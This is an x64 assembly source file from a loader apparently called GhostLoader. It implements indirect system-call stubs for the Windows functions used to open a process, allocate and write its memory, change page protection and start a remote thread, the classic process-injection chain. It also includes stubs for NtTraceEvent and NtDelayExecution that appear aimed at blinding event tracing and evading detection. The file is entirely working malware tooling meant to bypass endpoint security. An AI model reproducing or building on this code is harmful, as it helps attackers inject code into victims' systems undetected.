; syscalls.asm - GhostLoader by nobodyroot
.code
extern g_SyscallSSN:QWORD
extern g_SyscallGadget:QWORD

SYSCALL_INDIRECT macro
    mov r10, rcx
    mov eax, dword ptr [g_SyscallSSN]
    jmp qword ptr [g_SyscallGadget]
endm

NtOpenProcess proc
    mov qword ptr [g_SyscallSSN], 26h
    SYSCALL_INDIRECT
NtOpenProcess endp

NtAllocateVirtualMemory proc
    mov qword ptr [g_SyscallSSN], 18h
    SYSCALL_INDIRECT
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
    mov qword ptr [g_SyscallSSN], 3Ah
    SYSCALL_INDIRECT
NtWriteVirtualMemory endp

NtProtectVirtualMemory proc
    mov qword ptr [g_SyscallSSN], 50h
    SYSCALL_INDIRECT
NtProtectVirtualMemory endp

NtCreateThreadEx proc
    mov qword ptr [g_SyscallSSN], 0C7h
    SYSCALL_INDIRECT
NtCreateThreadEx endp

NtWaitForSingleObject proc
    mov qword ptr [g_SyscallSSN], 04h
    SYSCALL_INDIRECT
NtWaitForSingleObject endp

NtTraceEvent proc
    mov qword ptr [g_SyscallSSN], 5Eh
    SYSCALL_INDIRECT
NtTraceEvent endp

NtDelayExecution proc
    mov qword ptr [g_SyscallSSN], 34h
    SYSCALL_INDIRECT
NtDelayExecution endp

end

